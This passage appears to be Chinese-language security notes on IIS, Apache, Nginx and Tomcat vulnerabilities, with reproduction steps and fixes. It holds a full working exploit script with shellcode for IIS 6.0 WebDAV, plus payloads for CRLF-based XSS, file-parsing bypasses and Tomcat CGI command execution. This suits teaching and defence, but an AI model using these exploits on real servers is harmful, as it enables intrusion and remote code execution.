<li><p>不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过 4 个中文字会产生短文件名，但是IIS不支持中文猜测。</p>
</li>
</ol>
<p>短文件利用工具下载</p>
<p>修复建议修复建议</p>
<p>1 ）从CMD命令关闭NTFS 8.3文件格式的支持</p>
<p>Windows Server 2003： (1代表关闭， 0 代表开启）<br>关闭该功能：fsutil behavior set disable8dot3 1</p>
<p>Windows Server 2008 R2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询是否开启短文件名功能：fsutil 8dot3name query</span><br><span class="line">关闭该功能：fsutil 8dot3name set 1</span><br></pre></td></tr></table></figure>

<p>不同系统关闭命令稍有区别，该功能默认是开启的.</p>
<p>2 ）或从修改注册表关闭NTFS 8.3文件格式的支持</p>
<p>快捷键Win+R打开命令窗口，输入regedit打开注册表窗口</p>
<p>找到路径：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1 ， 1 代表不创建短文件<br>名格式</p>
<p>以上两种方式修改完成后，均需要重启系统生效。</p>
<p>Note:此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除，需要重新复制才会消失。<br>例:将web文件夹的内容拷贝到另一个位置，如c:\www到c:\ww,然后删除原文件夹，再重命名c:\ww到c:\www。</p>
<h3 id="HTTP-SYS-远程代码执行远程代码执行-MS15-034"><a href="#HTTP-SYS-远程代码执行远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS 远程代码执行远程代码执行 (MS15-034)"></a>HTTP.SYS 远程代码执行远程代码执行 (MS15-034)</h3><p>影响范围：<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R</p>
<p>复现：</p>
<p>在Windows7上 安装IIS7.5。<br>1.访问。</p>
<p>2.编辑请求头，增加Range: bytes&#x3D;0-18446744073709551615字段，若返回码状态为416 Requested Range Not Satisfiable，则存在HTTP.SYS远程代码执<br>行漏洞</p>
<p>漏洞有点鸡肋，配合其他漏洞使用还是可以用用的，具体使用可转至MSF中。</p>
<p>修复建议修复建议</p>
<p>安装修复补丁（KB3042553）</p>
<h3 id="RCE-CVE-2017"><a href="#RCE-CVE-2017" class="headerlink" title="RCE-CVE-2017-"></a>RCE-CVE-2017-</h3><p>Microsoft Windows Server 2003 R2中的Internet信息服务（IIS）6.0中的WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过<br>以”If：&lt;http：&#x2F;&#x2F;“开头的长标头执行任意代码PROPFIND请求。</p>
<p>影响范围：<br>在Windows 2003 R2（Microsoft(R) Windows(R) Server 2003, Enterprise Edition Service Pack 2）上使用IIS 6.0并开启WebDAV扩展。</p>
<p>复现：<br>CVE作者给出的exp 计算机弹弹弹！！！<br>用python2 运行，结果如下。</p>
<p>任务管理器开启了calc.exe进程，因为计算器是网络服务权限打开的，所以我们在桌面上看不见。</p>
<p>这个漏洞有几个需要注意的地方，如下。</p>
<p>由于作者提供的Exp执行之后就卡在那里了，因此不适合用弹计算机的shellcode进行测试，网上找了个dalao的回显shellcode来测试。</p>
<p>首先将上图中python2 IDE运行时产生的Raw类型的HTTP数据包copy保存至记事本中，然后在Burp Repeater模块 Paste from file。</p>
<p>将shellcode更换成如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>CVE作者给出的Exp是在默认端口，默认域名，默认路径的情况下适用。</p>
<p>第一个需要注意的是端口和域名绑定问题：</p>
<p>当端口改变时，If头信息中的两个url端口要与站点端口一致，如下。</p>
<p>当域名改变时，If头信息中的两个url域名要与站点域名一致，且HOST头也要与站点域名一致。如下</p>
<p>不修改Host将返回502,如下</p>
<p>Note:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试的时候凡是需要修改IIS配置的操作，修改完毕后都需要重启IIS，</span><br><span class="line">或者在不超过禁用阈值的前提下结束w3wp进程。</span><br></pre></td></tr></table></figure>

<p>第二个需要注意的是物理路径问题：</p>
<p>CVE作者提供的Exp是在 默认路径长度等于19(包括结尾的反斜杠)的情况下适用，IIS默认路径一般为：c:\inetpub\wwwroot</p>
<p>解决方法：</p>
<p>当路径长度小于 19 时需要对padding进行添加。<br>当路径长度大于 19 时需要对padding进行删除。</p>
<p>ROP和stackpivot前面的padding实际上为UTF8编码的字符，每三个字节解码后变为两个字节的UTF16字符，在保证Exp不出错的情况下，有0x58个字符是<br>没用的。所以可以将前0x108个字节删除，换成0x58个a或b。</p>
<p>原exp 修改后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding:utf-</span><br><span class="line">import socket</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((&#x27;192.168.124.129&#x27;,8888))</span><br><span class="line">pay=&#x27;PROPFIND / HTTP/1.1\r\nHost: http://www.lxhsec.com\r\nContent-Length: 0\r\n&#x27;</span><br><span class="line">pay+=&#x27;If: &lt;http://www.lxhsec.com:8888/aaaaaaa&#x27;</span><br><span class="line">pay+=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">pay+=&#x27;\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac&#x27;</span><br><span class="line">pay+=&#x27;&gt;&#x27;</span><br><span class="line">pay+=&#x27; (Not &lt;locktoken:write1&gt;) &lt;http://www.lxhsec.com:8888/bbbbbbb&#x27;</span><br><span class="line">pay+=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span><br><span class="line">pay+=&#x27;\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81&#x27;</span><br><span class="line">shellcode=&#x27;VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A&#x27;</span><br><span class="line">pay+=shellcode</span><br><span class="line">pay+=&#x27;&gt;\r\n\r\n&#x27;</span><br><span class="line">print pay</span><br><span class="line">sock.send(pay)</span><br><span class="line">data = sock.recv(80960)</span><br><span class="line">print data</span><br><span class="line">sock.close</span><br></pre></td></tr></table></figure>

<p>执行：</p>
<p>当路径长度小于 19 时，如下，需要增加 12 个a，b</p>
<p>而实际中路径常常大于 19 ，需要对padding进行删除。</p>
<p>当路径为c:\www\的时候，a有 107 个，加起来有 114 个，除去盘符有 111 个字符，所以可以把Exp的padding增加至 111 ，并逐次进行减少。当长度不匹配时返</p>
<p>回 500 ，成功时返回 200 ，通过爆破方式得到物理路径长度。<br>成功:</p>
<p>失败:</p>
<p>当然如果能得到物理路径，则用 114 减去物理路径长度（包括末尾的反斜杠）就是所需的padding长度。</p>
<p>第三个需要注意的是，超时问题。</p>
<p>当exp执行成功一段时间之后（大概十分钟到二十分钟左右，其间无论有无访问），再对这个站点执行exp永远不会成功，同时返回 400 。</p>
<p>解决方法：<br>1.等待w3wp重启。<br>2.测试旁站（因为每个池都是独立的w3wp进程，换一个可能在其他池的旁站进行尝试）</p>
<p>第四个需要注意的是，多次执行错误shellcode</p>
<p>多次执行错误的shellcode会覆盖很多不该覆盖的代码，从而导致正确的shellcode执行时也返回 500 ，<br>提示信息为：参数不正确，也可能什么都不返回。</p>
<p>解决方法：<br>1.等待w3wp重启。<br>2.测试旁站（因为每个池都是独立的w3wp进程，换一个可能在其他池的旁站进行尝试）</p>
<p>修复建议修复建议</p>
<p>关闭 WebDAV</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务<br>器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl&#x2F;Python等解释器编译到服务器中。</p>
<h4 id="解析漏洞解析漏洞-1"><a href="#解析漏洞解析漏洞-1" class="headerlink" title="解析漏洞解析漏洞"></a>解析漏洞解析漏洞</h4><p>未知扩展名解析漏洞未知扩展名解析漏洞</p>
<p>Apache的解析漏洞依赖于一个特性： <strong>Apache</strong> 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在 <strong>mime.types</strong> 文件内），则文件内），则<br>继续向左识别，直到识别到合法后缀才进行解析。继续向左识别，直到识别到合法后缀才进行解析。</p>
<p>复现：<br>这里使用phpstudy进行复现。<br>下载地址：<br><a href="http://phpstudy.php.cn/phpstudy/phpStudy(PHP5.2).zip">http://phpstudy.php.cn/phpstudy/phpStudy(PHP5.2).zip</a></p>
<p>访问phpinfo.php.xxx</p>
<p>实战中可以上传rar，owf等文件进行利用，如果上传phpinfo.php.jpg，即使文件名中有.php，也会直接解析为jpg。因为Apache认识.jpg,停止继续向左识别。</p>
<h5 id="AddHandler-导致的解析漏洞。导致的解析漏洞。"><a href="#AddHandler-导致的解析漏洞。导致的解析漏洞。" class="headerlink" title="AddHandler 导致的解析漏洞。导致的解析漏洞。"></a>AddHandler 导致的解析漏洞。导致的解析漏洞。</h5><p>如果运维人员给.php后缀增加了处理器：<br>AddHandler application&#x2F;x-httpd-php .php<br>那么，在有多个后缀的情况下，只要一个文件名中含有.php后缀，即被识别成PHP文件，没必要是最后一个后缀。<br>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<p>复现：</p>
<p>即使最右边的文件格式是在mime.types文件内，只要文件名中出现.php，就直接被解析为php。</p>
<h5 id="Apache-HTTPD-换行解析漏洞（换行解析漏洞（-CVE-2017-15715-））"><a href="#Apache-HTTPD-换行解析漏洞（换行解析漏洞（-CVE-2017-15715-））" class="headerlink" title="Apache HTTPD 换行解析漏洞（换行解析漏洞（ CVE-2017-15715 ））"></a>Apache HTTPD 换行解析漏洞（换行解析漏洞（ CVE-2017-15715 ））</h5><p>影响范围：2.4.0~2.4.29版本<br>环境：phpstudy2014 Apache + PHP5.4n</p>
<p>此漏洞形成的根本原因，在于$, 正则表达式中$不仅匹配字符串结尾位置，也可以匹配\n 或 \r</p>
<p>在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_FILES[&#x27;file&#x27;])) &#123;</span><br><span class="line">$name = basename($_POST[&#x27;name&#x27;]);</span><br><span class="line">$ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">if(in_array($ext, [&#x27;php&#x27;, &#x27;php3&#x27;, &#x27;php4&#x27;, &#x27;php5&#x27;, &#x27;phtml&#x27;, &#x27;pht&#x27;])) &#123;</span><br><span class="line">exit(&#x27;bad file&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;ok&quot;;</span><br><span class="line">move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &#x27;./&#x27;. $name);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>点击Go后，效果如下:</p>
<p>相同代码在Linux下进行测试，可以正常写入。</p>
<p>访问：</p>
<p>限制：获取文件名时不能用$_FILES[‘file’][‘name’]，因为它会自动把换行去掉。</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 升级到最新版本</span><br><span class="line">2. 或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</span><br></pre></td></tr></table></figure>

<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx是一款轻量级的Web 服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，并发能力强，事<br>实上nginx的并发能力确实在同类型的网页服务器中表现较好，</p>
<h3 id="Nginx-配置文件错误导致的解析漏洞配置文件错误导致的解析漏洞"><a href="#Nginx-配置文件错误导致的解析漏洞配置文件错误导致的解析漏洞" class="headerlink" title="Nginx 配置文件错误导致的解析漏洞配置文件错误导致的解析漏洞"></a>Nginx 配置文件错误导致的解析漏洞配置文件错误导致的解析漏洞</h3><p>对于任意文件名，在后面添加&#x2F;xxx.php（xxx为任意字符）后,即可将文件作为php解析。</p>
<p>例：info.jpg后面加上&#x2F;xxx.php，会将info.jpg 以php解析。</p>
<p>这里使用phpstudy2014 ，Nginx + PHP5.3n进行复现(以下复现若无特别说明均采用此环境)<br>结果：</p>
<p>该漏洞是Nginx配置所导致，与Nginx版本无关，下面是常见的漏洞配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">root /work/www/test;</span><br><span class="line">fastcgi_index index.php;</span><br><span class="line">fastcgi_param SCRIPT_FILENAME</span><br><span class="line">$document_root$fastcgi_script_name;</span><br><span class="line">include fastcgi_params;</span><br><span class="line">fastcgi_pass unix:/tmp/php-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当攻击者访问&#x2F;info.jpg&#x2F;xxx.php时， Nginx将查看URL，看到它以.php结尾，并将路径传递给PHP fastcgi处理程序。<br>Nginx传给php的路径为c:&#x2F;WWW&#x2F;info.jpg&#x2F;xxx.php,<br>在phpinfo中可以查看_SERVER[“ORIG_SCRIPT_FILENAME”]得到。</p>
<p>PHP根据URL映射，在服务器上寻找xxx.php文件，但是xxx.php不存在，又由于cgi.fix_pathinfo默认是开启的，因此PHP 会继续检查路径中存在的文件，并将<br>多余的部分当作 PATH_INFO。接着PHP在文件系统中找到.jpg文件，而后以PHP的形式执行.jpg的内容，并将&#x2F;xxx.php存储在 PATH_INFO 后丢弃，因此我们<br>在phpinfo中的$_SERVER[‘PATH_INFO’]看的到值为空。</p>
<p>Note: <strong>php</strong> 的一个选项：的一个选项： <strong>cgi.fix_pathinfo</strong> ，该选项默认开启，值为，该选项默认开启，值为 <strong>1</strong> ，用于修理路径，，用于修理路径，<br>例如：当php遇到文件路径”&#x2F;info.jpg&#x2F;xxx.php&#x2F;lxh.sec”时，若”&#x2F;info.jpg&#x2F;xxx.php&#x2F;lxh.sec”不存在，则会去掉最后的”&#x2F;lxh.sec”，然后判断”&#x2F;info.jpg&#x2F;xxx.php”是否存</p>
<p>在, 若存在则将&#x2F;info.jpg&#x2F;xxx.php当作文件&#x2F;info.jpg&#x2F;xxx.php&#x2F;lxh.sec，若&#x2F;info.jpg&#x2F;xxx.php仍不存在，则继续去掉xxx.php,依此类推。</p>
<p>修复建议修复建议</p>
<p>1.配置cgi.fix_pathinfo(php.ini中)为 0 并重启php-cgi程序</p>
<p>结果：</p>
<p>2.或如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。<br>或将上传存储的内容与网站分离，即站库分离。</p>
<p>3.或高版本PHP提供了security.limit_extensions这个配置参数，设置security.limit_extensions &#x3D; .php</p>
<h3 id="Nginx-空字节任意代码执行漏洞空字节任意代码执行漏洞"><a href="#Nginx-空字节任意代码执行漏洞空字节任意代码执行漏洞" class="headerlink" title="Nginx 空字节任意代码执行漏洞空字节任意代码执行漏洞"></a>Nginx 空字节任意代码执行漏洞空字节任意代码执行漏洞</h3><p>影响版本：Nginx 0.5*, 0.6*,0.7 &lt;&#x3D; 0.7.65,0.8 &lt;&#x3D; 0.8.</p>
<p>这里提供个打包好的Windows环境 Nginx 0.7.65+php 5.3.</p>
<p>链接：<a href="https://pan.baidu.com/s/1FUVJv9iFCcX9Qp5D5AMxKw">https://pan.baidu.com/s/1FUVJv9iFCcX9Qp5D5AMxKw</a><br>提取码：imdm</p>
<p>解压后，在Nginx目录下执行startup.bat</p>
<p>然后在nginx-0.7.65&#x2F;html&#x2F;目录下创建info.jpg,内容为,</p>
<p>访问info.jpg，并抓包，修改为info.jpg..php，在Hex选修卡中将jpg后面的.，更改为 00.</p>
<p>Note:该漏洞不受cgi.fix_pathinfo影响，当其为 0 时，依旧解析。</p>
<p>修复建议修复建议</p>
<p>升级Nginx版本</p>
<h3 id="Nginx-文件名逻辑漏洞（文件名逻辑漏洞（-CVE-2013-4547-））"><a href="#Nginx-文件名逻辑漏洞（文件名逻辑漏洞（-CVE-2013-4547-））" class="headerlink" title="Nginx 文件名逻辑漏洞（文件名逻辑漏洞（ CVE-2013-4547 ））"></a>Nginx 文件名逻辑漏洞（文件名逻辑漏洞（ CVE-2013-4547 ））</h3><p>影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.</p>
<p>在Windows弄了个环境，后来发现要文件名的后面存在空格，而Windows是不允许存在此类文件的，因此这里复现，使用Vulhub的docker进行复现。</p>
<p>访问<a href="http://your-ip:8080/">http://your-ip:8080/</a> 上传文件</p>
<p>访问<a href="http://your-ip:8080/uploadfiles/info.jpg">http://your-ip:8080/uploadfiles/info.jpg</a>, 并抓包，修改为info.jpg…php, 在Hex选修卡中将jpg后面的两个点2e改成 20 , 00<br>点击Go,如下。</p>
<p>Note:该漏洞不受cgi.fix_pathinfo影响，当其为 0 时，依旧解析，在Windows上有所限制。</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 设置security.limit_extensions = .php</span><br><span class="line">2. 或升级Nginx</span><br></pre></td></tr></table></figure>

<h3 id="Nginx-配置错误导致的安全问题配置错误导致的安全问题"><a href="#Nginx-配置错误导致的安全问题配置错误导致的安全问题" class="headerlink" title="Nginx 配置错误导致的安全问题配置错误导致的安全问题"></a>Nginx 配置错误导致的安全问题配置错误导致的安全问题</h3><h5 id="CRLF-注入注入"><a href="#CRLF-注入注入" class="headerlink" title="CRLF 注入注入"></a>CRLF 注入注入</h5><p>查看Nginx文档，可以发现有三个表示uri的变量：<br>1.$uri<br>2.$document_uri<br>3.$request_uri</p>
<p>1 和 2 表示的是解码以后的请求路径，不带参数； 3 表示的是完整的URI（没有解码）</p>
<p>Nginx会将 1 ， 2 进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。</p>
<p>错误配置:</p>
<p>访问：<br>[<a href="http://127.0.0.1/%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src=1%20onerror=alert(/xss/)%3E]">http://127.0.0.1/%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src=1%20onerror=alert(/xss/)%3E]</a>(<a href="http://127.0.0.1/">http://127.0.0.1/</a> X-XSS-Protection: 0  )<br>将返回包的Location端口设置为小于 80 ，使得浏览器不进行跳转，执行XSS。</p>
<p>结果：</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">return 302 https://$host$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目录穿越目录穿越</p>
<p>Nginx在配置别名（Alias）的时候，如果忘记加&#x2F;，将造成一个目录穿越漏洞。</p>
<p>错误的配置文件示例（原本的目的是为了让用户访问到C:&#x2F;WWW&#x2F;home&#x2F;目录下的文件）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /files &#123;</span><br><span class="line">autoindex on;</span><br><span class="line">alias c:/WWW/home/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>修复建议修复建议</p>
<p>只需要保证location和alias的值都有后缀&#x2F;或都没有&#x2F;这个后缀。</p>
<p>目录遍历目录遍历</p>
<p>当Nginx配置文件中，autoindex 的值为on时，将造成一个目录遍历漏洞。</p>
<p>结果:</p>
<p>修复建议修复建议</p>
<p>将autoindex 的值为置为off。</p>
<h5 id="add-header-被覆盖被覆盖"><a href="#add-header-被覆盖被覆盖" class="headerlink" title="add_header 被覆盖被覆盖"></a>add_header 被覆盖被覆盖</h5><p>Nginx的配置文件分为Server、Location等一些配置块，并且存在包含关系，子块会继承父块的一些选项，比如add_header。</p>
<p>如下配置中，整站（父块中）添加了CSP头：</p>
<p>正常情况下访问:</p>
<p>当访问 &#x2F;test2时，XSS被触发。因&#x2F;test2的location中添加了X-Content-Type-Options头，导致父块中的add_header全部失效。</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发<br>和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个<br>应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进</p>
<p>程单独运行的。</p>
<h3 id="Tomcat-任意文件写入（任意文件写入（-CVE-2017-12615-））"><a href="#Tomcat-任意文件写入（任意文件写入（-CVE-2017-12615-））" class="headerlink" title="Tomcat 任意文件写入（任意文件写入（ CVE-2017-12615 ））"></a>Tomcat 任意文件写入（任意文件写入（ CVE-2017-12615 ））</h3><p>环境：Tomcat&#x2F;8.0.30</p>
<p>漏洞本质是Tomcat配置文件&#x2F;conf&#x2F;web.xml 配置了可写（readonly&#x3D;false），导致我们可以往服务器写文件：</p>
<p>增加完配置之后，记得重启Tomcat，效果如下:</p>
<p>当readonly&#x3D;true时，效果如下。</p>
<p>修复建议修复建议</p>
<p>将readonly&#x3D;true，默认为true。</p>
<h3 id="Tomcat-远程代码执行（远程代码执行（-CVE-2019-0232-））"><a href="#Tomcat-远程代码执行（远程代码执行（-CVE-2019-0232-））" class="headerlink" title="Tomcat 远程代码执行（远程代码执行（ CVE-2019-0232 ））"></a>Tomcat 远程代码执行（远程代码执行（ CVE-2019-0232 ））</h3><p>影响范围：9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93<br>影响系统： Windows</p>
<p>测试环境：<br>Apache Tomcat v8.5.39<br>JDK 1.8.0_144</p>
<p>修改配置：<br>web.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">&lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">&lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br><span class="line">&lt;init-param&gt;</span><br><span class="line">&lt;param-name&gt;executable&lt;/param-name&gt;</span><br><span class="line">&lt;param-value&gt;&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure>

<p>content.xml</p>
<p>在Tomcat\webapps\ROOT\WEB-INF新建cgi目录，并创建lxhsec.bat文件，内容任意。</p>
<p>访问<a href="http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&dir">http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;dir</a></p>
<p>执行命令<a href="http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&C:/WINDOWS/system32/net+user">http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;C:/WINDOWS/system32/net+user</a></p>
<p>Note:net命令的路径要写全，直接写net user，Tomcat控制台会提示net不是内部命令，也不是可运行的程序，另 必须使用+号连接，使用空格，%2B都会执<br>行失败，控制台报错。</p>
<p>修复建议修复建议</p>
<p>这个默认是关闭的，如果打开了请关闭，若需使用请升级版本。</p>
<h3 id="Tomcat-弱口令弱口令-amp-amp-后台后台-getshell-漏洞漏洞"><a href="#Tomcat-弱口令弱口令-amp-amp-后台后台-getshell-漏洞漏洞" class="headerlink" title="Tomcat + 弱口令弱口令 &amp;&amp; 后台后台 getshell 漏洞漏洞"></a>Tomcat + 弱口令弱口令 &amp;&amp; 后台后台 getshell 漏洞漏洞</h3><p>环境：Apache Tomcat&#x2F;7.0.94</p>
<p>在conf&#x2F;tomcat-users.xml文件中配置用户的权限：</p>
